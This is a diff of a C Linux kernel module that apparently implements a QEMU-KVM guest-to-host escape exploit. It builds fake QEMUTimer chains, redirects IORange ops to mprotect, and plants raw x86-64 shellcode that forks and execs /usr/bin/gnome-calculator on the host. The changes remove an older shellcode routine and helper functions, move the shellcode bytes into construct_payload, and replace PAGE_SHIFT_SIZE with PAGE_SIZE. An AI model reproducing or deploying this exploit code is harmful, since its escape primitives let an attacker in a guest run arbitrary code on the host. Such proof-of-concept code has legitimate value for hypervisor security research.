@@ -60,19 +60,6 @@ int assert(int val){
     return 0;
 }
 
-struct IORange *align_kmalloc(int cache_size){
-    struct IORange *object;
-
-    static struct kmem_cache *align_cache_p;
-    align_cache_p = kmem_cache_create("align_cache", cache_size, 0, SLAB_HWCACHE_ALIGN, NULL);
-    if (!align_cache_p)
-        die_errno("align_kmalloc");
-
-    object = kmem_cache_alloc(align_cache_p, GFP_KERNEL);
-
-    return object;
-}
-
 //from stackoverflow
 #include <linux/fs.h>
 #include <asm/segment.h>
@@ -113,26 +100,6 @@ int file_read(struct file* file, unsigned long long offset, unsigned char* data,
       printk("offset is %lli\n",offset);
     set_fs(oldfs);
     return ret;
-}
-
-//Writing data to a file (similar to pwrite):
-int file_write(struct file* file, unsigned long long offset, unsigned char* data, unsigned int size) {
-    mm_segment_t oldfs;
-    int ret;
-
-    oldfs = get_fs();
-    set_fs(get_ds());
-
-    ret = vfs_write(file, data, size, &offset);
-
-    set_fs(oldfs);
-    return ret;
-}
-
-//Syncing changes a file (similar to fsync):
-int file_sync(struct file* file) {
-    vfs_fsync(file, 0);
-    return 0;
 }
 
 //////////////////////////////////
@@ -375,47 +342,8 @@ struct shared_state {
 };
 
 static volatile page_aligned struct shared_state share = {
-  .prog = "\x55\
-\x48\x8d\x2d\xf8\xff\xff\xff\
-\x31\xf6\x83\xc6\x02\
-\x31\xff\x83\xc7\x70\
-\x8b\x45\x67\
-\xff\xd0\
-\x48\x83\xec\x20\
-\x48\x8d\x45\x4d\
-\x48\x89\x44\x24\x10\
-\x31\xc0\x48\x89\x44\x24\x18\
-\x8b\x45\x6b\
-\xff\xd0\
-\x85\xc0\
-\x75\x15\
-\x48\x8d\x54\x24\x10\
-\x48\x8b\x02\
-\x48\x89\xd6\
-\x48\x89\xc7\
-\x8b\x45\x6f\
-\xff\xd0\
-\x48\x83\xc4\x20\
-\x5d\
-\xc3/usr/bin/gnome-calculator"
-  
+  .prog = "/usr/bin/gnome-calculator"
 };
-
-void shellcode(struct shared_state *share) {
-    char *args[2];
-    ((void(*)(int, int))ISA_UNASSIGN_IOPORT)(0x70, 2);
-    ((typeof(mprotect)*)MPROTECT)((void*)share->shellcode,
-                                  2*PAGE_SHIFT_SIZE,
-                                  PROT_READ|PROT_WRITE|PROT_EXEC);
-    //char *args[2] = {share->prog, NULL};
-    args[0] = share->prog;
-    args[1] = NULL;
-    if (((typeof(fork)*)FORK)() == 0)
-        ((typeof(execv)*)EXECV)(share->prog, args);
-    share->done = 1;
-}
-asm("end_shellcode:");
-extern char end_shellcode[];
 
 /*
  * Construct and return a single fake timer, with the specified
@@ -442,37 +370,13 @@ struct QEMUTimer *construct_payload(void) {
     struct IORange *ioport;
     struct IORangeOps *ops;
     struct QEMUTimer *timer;
-
-    ops = kmalloc(sizeof *ops, GFP_ATOMIC);
-    ops->read = MPROTECT;
-    ops->write = 0;
-
-    ioport = align_kmalloc(2*PAGE_SHIFT_SIZE);
-    ioport->ops = gva_to_hva(ops);
-    ioport->base = -(2*PAGE_SHIFT_SIZE);
-
-    share.shellcode = gva_to_hva(ioport);
-
-    memcpy(ioport + 1, shellcode, (void*)end_shellcode - (void*)shellcode);
-
-    timer = NULL;
-    timer = fake_timer(gva_to_hva(ioport+1), gva_to_hva((void*)&share), timer);
-    timer = fake_timer(IOPORT_READL_THUNK, gva_to_hva(ioport), timer);
-    timer = fake_timer(CPU_OUTL, 0, timer);
-    return timer;
-}
-
-struct QEMUTimer *construct_payload_j(void) {
-    struct IORange *ioport;
-    struct IORangeOps *ops;
-    struct QEMUTimer *timer;
-    unsigned  long int mask = ~(PAGE_SHIFT_SIZE-1ull);
+    unsigned  long int mask = ~(PAGE_SIZE-1ull);
     //int i;
     int len = 0x69;//0x7c;
     uint8_t* ptr8;
     uint32_t* ptr32;
 
-    const char* sc1 = "\x55\
+    const char* sc = "\x55\
 \x48\x8d\x2d\xf8\xff\xff\xff\
 \x31\xf6\x83\xc6\x02\
 \x31\xff\x83\xc7\x70\
@@ -495,12 +399,12 @@ struct QEMUTimer *construct_payload_j(void) {
 \x48\x83\xc4\x20\
 \x5d\
 \xc3/usr/bin/gnome-calculator";
-    const char * sc = "/usr/bin/gnome-calculator";
     printk(sc);
     len = strlen(sc)+1;
 
     printk("shellcode len is %i\n",len);
     printk("mask is %016lx\n",mask);
+
     ops = kmalloc(sizeof *ops,GFP_ATOMIC);
     if (ops ==NULL){
         printk("kmalloc failed\n");
@@ -510,7 +414,7 @@ struct QEMUTimer *construct_payload_j(void) {
     ops->read = MPROTECT;
     ops->write = 0;
 
-    ioport = (struct IORange*) kmalloc(3*PAGE_SHIFT_SIZE,GFP_ATOMIC);
+    ioport = (struct IORange*) kmalloc(3*PAGE_SIZE,GFP_ATOMIC);
     printk("IORange size is %li\n",sizeof(struct IORange));
     printk("ioport is %016lx\n",(long unsigned int) ioport);
     printk("ioport + 1 is 0x%lx\n",(long unsigned int)((char*) (ioport+1)));
@@ -519,25 +423,19 @@ struct QEMUTimer *construct_payload_j(void) {
 
     mask = mask >> 12;
     mask = mask << 12;
-    /*for(i=0; i< 12;i++)
-        mask = mask /2 ;
-    for(i=0; i < 12; i++)
-        mask = mask *2;*/
 
-    mask += PAGE_SHIFT_SIZE;
+    mask += PAGE_SIZE;
 
     ioport = (struct IORange*)mask;
     printk("ioport is %016lx\n", (long unsigned int)ioport);
 
     ioport->ops = gva_to_hva(ops);
-    ioport->base = -(2*PAGE_SHIFT_SIZE);
+    ioport->base = -(2*PAGE_SIZE);
 
     share.shellcode = gva_to_hva(ioport);
 
-    //printk("sc is 0x%x",*((int*)sc));
-    //memcpy(ioport + 1, sc, len);
-    printk("%i bytes of shellcode written\n",
-           sprintf((char*)  (ioport+1),sc));//&len));
+    printk("sc is 0x%x",*((int*)sc));
+    memcpy(ioport + 1, sc, len);
     printk((char*)(ioport+1));
     ptr8 = (uint8_t*)(ioport+1);
     ptr8 += len;
@@ -549,10 +447,6 @@ struct QEMUTimer *construct_payload_j(void) {
     printk("EXECV is %x\n",*--ptr32);
     timer = NULL;
     timer = fake_timer(gva_to_hva(ioport+1), gva_to_hva((void*)&share), timer);//joke
-
-    //timer = fake_timer(0xdeadbeef\xcafebabe,timer);
-    //timer = fake_timer(0, 0 ,timer);//print 40ascii '@'
-    //timer = fake_timer(CPU_OUTL, 0x5e155e, timer);//
     timer = fake_timer(IOPORT_READL_THUNK, gva_to_hva(ioport), timer);
     timer = fake_timer(CPU_OUTL, 0, timer);//0x5e155e
 
@@ -616,6 +510,7 @@ uint64_t read_host8(struct QEMUTimer *head, struct QEMUTimer *chain, hva_t addr)
  *
  * See qemu-kvm:hw/mc146818rtc.c for the relevant code.
  */
+
 void wait_rtc(void) {
     struct file *fd;
     struct rtc_device *rtc;
@@ -692,9 +587,6 @@ static int __init server_init( void )
 
     snapshot_targets();
 
-    //if (sys_iopl(3))
-    //    printk("iopl");
-
     commit_targets();
 
     printk("[+] Constructing socket...\n");
@@ -722,12 +614,9 @@ static int __init server_init( void )
     printk("[+] Done hotplug...\n");
     i = 0;
     while (timer->expire_time == 0) {
-        //printk("[+] i=%d, packet=%s.\n", i, packet);
         sock_sendmsg(sock, &msg, len);
         if (++i % 1000 == 0){
-            //printk("[+] refresh_targets: timer->expire_time=%d.\n", timer->expire_time);
             refresh_targets();
-            //break;
         }
     }
     sock_release(sock);
@@ -741,10 +630,8 @@ static int __init server_init( void )
     printk("[+] highmem hva base = %016lx\n", (unsigned long int)highmem_hva_base);
     printk("[+] Go!\n");
 
-    //safe to here
     timer->next   = gva_to_hva(construct_payload());
     timer->expire_time = 0;
-    //               while(1);
 
     set_fs(oldfs);
     commit_targets();
@@ -761,11 +648,6 @@ static int __init server_init( void )
 static void __exit server_exit( void )
 {
     printk("EXIT MODULE");
-}
-
-#include <asm/apic.h>
-void foo(void){
-    apic->write(0,0);
 }
 
 module_init(server_init);
